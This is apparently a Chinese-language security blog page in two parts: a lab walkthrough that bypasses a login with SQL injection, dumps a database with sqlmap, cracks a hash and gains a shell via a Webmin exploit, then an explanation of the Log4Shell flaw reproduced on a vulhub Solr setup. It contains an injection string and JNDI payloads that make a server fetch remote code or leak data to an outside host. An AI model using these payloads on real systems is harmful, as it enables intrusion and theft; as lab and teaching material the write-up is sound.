&lt;h1 id=&#34;0x10-web_exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x10-web_exp&#34;&gt;#&lt;/a&gt; 0x10 web_exp&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;只有一个登陆框有功能点 因此我们测试 sql 万能密码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;sql 万能密码&lt;/th&gt;
&lt;th&gt;&lt;a href=&#34;sql%E5%88%86%E7%B1%BB.md#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81&#34;&gt;万能密码&lt;/a&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;POST /index.php HTTP/1.1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Host: &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.12.101&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-Length: &lt;span class=&#34;token number&#34;&gt;44&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Cache-Control: max-age&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Upgrade-Insecure-Requests: &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Origin: http://10.10.12.101&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-Type: application/x-www-form-urlencoded&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;User-Agent: Mozilla/5.0 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Windows NT &lt;span class=&#34;token number&#34;&gt;10.0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; Win64&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; x64&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; Chrome/116.0.5845.97 Safari/537.36&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.9&lt;/span&gt;,image/avif,image/webp,image/apng,*/*&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.8&lt;/span&gt;,application/signed-exchange&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;b3&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.7&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Referer: http://10.10.12.101/index.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept-Encoding: gzip, deflate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept-Language: zh-CN,zh&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.9&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Cookie: &lt;span class=&#34;token assign-left variable&#34;&gt;PHPSESSID&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;o3940qfoad5k0trucelricpo82&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Connection: close&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;admin&#39;or &lt;span class=&#34;token assign-left variable&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;-- &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
&lt;p&gt;跳转到一个页面 主要是经营搜索的 这个功能点很可能就有一些搜索的 % 匹配&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/top10%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E7%AE%80%E4%BB%8B.md#H2%20%E2%80%8B%EF%BC%883%EF%BC%89%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9&#34;&gt;H2 ​（3）搜索型注入点&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;开始测试 searchitem=2ad123&#39;  因为这个东西感觉只能是字符的注入&lt;br /&gt;
因此开始测试 &#39; 发现报错&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;You have an error &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; your &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; syntax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;check&lt;/span&gt; the manual that corresponds &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; your MySQL server version &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;right&lt;/span&gt; syntax &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; near &lt;span class=&#34;token string&#34;&gt;&#39;%&#39;&lt;/span&gt;&#39; at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;***&#39;%&#39;&#39;  可以看出来 就是单引号&lt;br /&gt;
那就好办 直接一把梭&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;但是好久没练习了 借着这个靶场玩一下&lt;br /&gt;
目前发现可以是回显注入&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;sql%E5%88%86%E7%B1%BB.md#%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5&#34;&gt;回显注入&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不用测了 基本没防护 除了堆注入没有感觉其他都有&lt;/p&gt;
&lt;h2 id=&#34;0x11-sqlmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x11-sqlmap&#34;&gt;#&lt;/a&gt; 0x11 sqlmap&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;sqlmap&lt;/th&gt;
&lt;th&gt;&lt;a href=&#34;%E5%B8%B8%E8%A7%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%BC%8F%E6%B4%9E/sqlmap.md&#34;&gt;sqlmap&lt;/a&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;/table&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sqlmap &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; r.txt &lt;span class=&#34;token parameter variable&#34;&gt;--dbms&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mysql &lt;span class=&#34;token parameter variable&#34;&gt;--dump&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;* 直接拖库得到 用户获得 hash 和用户名&lt;/p&gt;
&lt;p&gt;串 &amp;quot;ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14&amp;quot; 的长度（64 个字符），它看起来像是一个 SHA-256 哈希值&lt;/p&gt;
&lt;p&gt;用户:***agent47&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本来想着能不能 直接 拿到 shell 因为我发现 这是一个 root 用户使用的 MySQL&lt;br /&gt;
 但是没办法拿不到&lt;br /&gt;
&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240608195424.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;0x20-普通权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x20-普通权限&#34;&gt;#&lt;/a&gt; 0x20 普通权限&lt;/h1&gt;
&lt;p&gt;先让我们的开膛手约翰叔叔 爆一下&lt;br /&gt;
&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607164341.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607163346.png&#34; alt=&#34;image.png&#34; /&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240607163346.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;直接上线&lt;/p&gt;
&lt;h1 id=&#34;0x30-隐藏服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x30-隐藏服务&#34;&gt;#&lt;/a&gt; 0x30 隐藏服务&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;ss -tulpn  可以看到开放了 很多端口 但是我们的 namp 扫描时候只&lt;br /&gt;
开放了 80 22 因此做一个端口转发 使得端口服务能够暴露出来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240609104300.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
 可以看到我们的 kali 可以和 目标主机通信并且我们已经拿到了&lt;br /&gt;
对标 agent47 用户的权限我们完全可以做一个远程端口转发 使得隐藏的服务暴露出来&lt;br /&gt;
增加我们的攻击面&lt;br /&gt;
在 kali 上做一个转发&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-L&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10000&lt;/span&gt;:localhost:10000 agent47@10.10.112.17&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;然后进入 查看可以知道是 Webmin 1.58&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;远程代码执行漏洞&lt;/th&gt;
&lt;th&gt;&lt;a href=&#34;Webmin%201.580.md&#34;&gt;Webmin 1.580&lt;/a&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;/table&gt;
&lt;h1 id=&#34;0x31-get_shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x31-get_shell&#34;&gt;#&lt;/a&gt; 0X31  Get_shell&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;直接 msf 搜索相对应模块&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240609165809.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240609165837.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;

 &lt;h3 id=&#34;log4j-2x&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#log4j-2x&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Log4j 2.x&lt;/strong&gt;:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-2021-44228），也称为 Log4Shell 漏洞。该漏洞允许攻击者通过 JNDI 查找恶意代码来远程执行代码，影响范围广泛。这个漏洞在 Log4j 2.0 到 2.14.1 版本中存在，并已在 2.15.0 及后续版本中得到修复&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Apache log4j 是 Apache 的一个开源项目，Apache log4j 2 是一个就 Java 的日志记录工具。通过重写了 log4j 框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI 组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。log4j2 中存在&lt;strong&gt; JNDI 注入漏洞&lt;/strong&gt;，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码&lt;/p&gt;
&lt;h3 id=&#34;jndi简单介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jndi简单介绍&#34;&gt;#&lt;/a&gt; JNDI 简单介绍&lt;/h3&gt;
&lt;p&gt;JNDI (Java Naming and Directory Interface,Java 命名和目录接口) 是 SUN 公司提供的一种标准的 Java 命名系统接口，JNDI 提供统一的客户端 API，通过不同的访问提供者接口 JNDI 服务供应接口 (SPI) 的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。&lt;br /&gt;
JNDI 注入主要是用过下载远程 class，来运行恶意代码。JNDI 注入攻击时常用的就是通过 RMI 和 LDAP 两种服务。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240806105256.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/8a6d0c48141bbdaaceb44fe403ddb125.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞验证&#34;&gt;#&lt;/a&gt; 漏洞验证:&lt;/h4&gt;
&lt;p&gt;一般来讲 log4j 的漏洞，是一种严重的漏洞，因为他覆盖面广，使用广泛，因此可以看到我们对于 log4&lt;br /&gt;
j，一般都是在一些大型的服务器上的安装的组件的上面去验证。&lt;/p&gt;
&lt;h4 id=&#34;漏洞分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞分析&#34;&gt;#&lt;/a&gt; 漏洞分析:&lt;/h4&gt;
&lt;p&gt;最主要还是 log4j 可以通过特定的形式例如:${} 来进行一个查询替换的功能，例如我们的环境变量。因此还可以暴露敏感信息。但是他不仅可以查找变量进行替换还可以使用 ，jndi 的查询服务可以查询目录和命名服务。之后就可以利用 rmi 或者 ldap 去访问我们的 web 服务器上的相关 class 文件，下载之后执行再反弹 shell 回到我们的攻击机器。&lt;/p&gt;
&lt;h5 id=&#34;以minecraft为例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#以minecraft为例&#34;&gt;#&lt;/a&gt; 以 minecraft 为例&lt;/h5&gt;
&lt;p&gt;Minecraft 服务器是专门为 Minecraft 游戏设计的，它们允许玩家在 Minecraft 游戏中进行多人游戏和互动。这些服务器使用特定的 Minecraft 服务器软件来运行，这些软件是为支持 Minecraft 游戏而开发的。具体来说，Minecraft Java Edition 使用的服务器软件称为 Minecraft: Java Edition Server，而 Minecraft Bedrock Edition（如手机版、Windows 10 版等）使用的服务器软件称为 Minecraft Bedrock Edition Server。&lt;/p&gt;
&lt;p&gt;因此，Minecraft 服务器不是通用的服务器，不能像一般的 Web 服务器或游戏服务器那样用于其他用途。它们专门设计用于运行 Minecraft 游戏，管理游戏世界、玩家互动和游戏规则。&lt;/p&gt;
&lt;p&gt;因此我们需要一个相应版本的启动器。然后连接服务器在游戏中输入我们的 payload。${jndi:ldap:ip/a} 下载对应的 web 服务器上的 payload 从而 getshell&lt;/p&gt;
&lt;h4 id=&#34;不同服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不同服务器&#34;&gt;#&lt;/a&gt; 不同服务器&lt;/h4&gt;
&lt;p&gt;不同环境依赖，不同服务器对于 log4j 记录接口是不一样的。因此可能触发点虽然都是 ${} 但是我们输入的位置和接口不一样，要随机而变。&lt;/p&gt;
&lt;h3 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
&lt;p&gt;根据 vulhub 官方给出的漏洞环境进行复现。&lt;br /&gt;
Apache Log4j2 不是一个特定的 Web 服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如 Apache Solr。&lt;/p&gt;
&lt;p&gt;执行如下命令启动一个 Apache Solr 8.11.0，其依赖了 Log4j 2.14.1：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;docker&lt;/span&gt; compose up &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;服务启动后，访问 &lt;code&gt;http://your-ip:8983&lt;/code&gt;  即可查看到 Apache Solr 的后台页面。可以看到这就是&lt;br /&gt;
 Apache Solr 是一个可以作为服务运行的应用程序。它通常以服务器模式运行，接受来自客户端的搜索请求，并返回搜索结果。Solr 提供了一个 HTTP 接口，可以通过 RESTful API 进行操作。这使得 Solr 可以方便地与其他应用程序集成，通过 Web 请求进行数据索引和搜索查询。&lt;/p&gt;
&lt;p&gt;Solr 还支持配置为集群模式，以处理大规模的数据和高负载的搜索请求。它具有许多功能，如分布式搜索、实时索引、负载均衡和自动故障转移，适用于大规模和高性能的搜索需求&lt;/p&gt;
&lt;h5 id=&#34;验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证&#34;&gt;#&lt;/a&gt; 验证&lt;/h5&gt;
&lt;p&gt;一般验证都是用 dnslog&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$&amp;#123;jndi&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;dns&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;$&amp;#123;sys&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;java.version&amp;#125;&lt;/span&gt;.example.com&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在 Log4j 中， &lt;code&gt;$&amp;#123;sys:java.version&amp;#125;&lt;/code&gt;  是一种使用变量替换的语法，用于在日志配置文件中插入动态值。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$&amp;#123;sys:java.version&amp;#125;&lt;/code&gt;  是一个占位符，表示 Log4j 会用实际的系统属性值来替换它。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sys&lt;/code&gt;  表示这是一个系统属性的占位符。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;java.version&lt;/code&gt;  是要替换的具体系统属性的名称。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在这个例子中， &lt;code&gt;java.version&lt;/code&gt;  是一个 Java 系统属性，它包含了当前运行的 Java 版本信息。Log4j 会在解析配置文件时用这个系统属性的实际值替换  &lt;code&gt;$&amp;#123;sys:java.version&amp;#125;&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240811221326.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
 此时我们的环境已经起来了，可以看到这个就是 solar admin 系统。我们需要找到 log4j 记录的地方，&lt;/p&gt;
&lt;h4 id=&#34;核心&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#核心&#34;&gt;#&lt;/a&gt; 核心&lt;/h4&gt;
&lt;p&gt;在 Apache Solr 中， &lt;code&gt;/solr/admin/cores&lt;/code&gt;  是 Solr 的一个管理路径，用于操作和管理 Solr 的 “cores”（核心）。以下是这个路径的主要用途：&lt;/p&gt;
&lt;h3 id=&#34;主要功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主要功能&#34;&gt;#&lt;/a&gt; &lt;strong&gt;主要功能&lt;/strong&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;列出核心&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问  &lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=STATUS&lt;/code&gt;  可以查看当前 Solr 实例中的所有核心及其状态。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;查看核心状态&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提供核心的运行状态、配置信息和统计数据，帮助监控和管理 Solr 的各个核心。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;管理核心&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过这个路径，你可以执行各种管理操作，比如重新加载、卸载、创建新核心等。例如：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=RELOAD&amp;amp;core=&amp;lt;core_name&amp;gt;&lt;/code&gt;  用于重新加载指定核心。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=UNLOAD&amp;amp;core=&amp;lt;core_name&amp;gt;&lt;/code&gt;  用于卸载指定核心。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;示例使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#示例使用&#34;&gt;#&lt;/a&gt; &lt;strong&gt;示例使用&lt;/strong&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;列出所有核心&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;Copy Code&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=STATUS&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这将返回一个 JSON 格式的响应，包含所有核心的详细状态信息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;重新加载核心&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;Copy Code&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/solr/admin/cores?action=RELOAD&amp;amp;core=my_core&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这将重新加载名为  &lt;code&gt;my_core&lt;/code&gt;  的核心，适用于配置变更后需要重新加载核心的情况。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;如何访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#如何访问&#34;&gt;#&lt;/a&gt; &lt;strong&gt;如何访问&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;确保 Solr 实例正在运行，并且你能够通过指定的主机和端口访问 Solr。访问  &lt;code&gt;/solr/admin/cores&lt;/code&gt;  可以帮助你进行核心的监控和管理工作，是 Solr 系统管理中的重要一环。&lt;/p&gt;
&lt;p&gt;Solr 的查询记录和其他重要事件通常会被记录在 log4j 日志中。Solr 使用 log4j 进行日志记录，具体的日志记录位置和详细程度可以通过 log4j 配置文件进行设置。查询记录、错误信息、系统状态等会被写入到指定的日志文件中，帮助你监控和调试 Solr 实例。通过这一点，我们可以触发 ${} 进行替换触发。&lt;/p&gt;
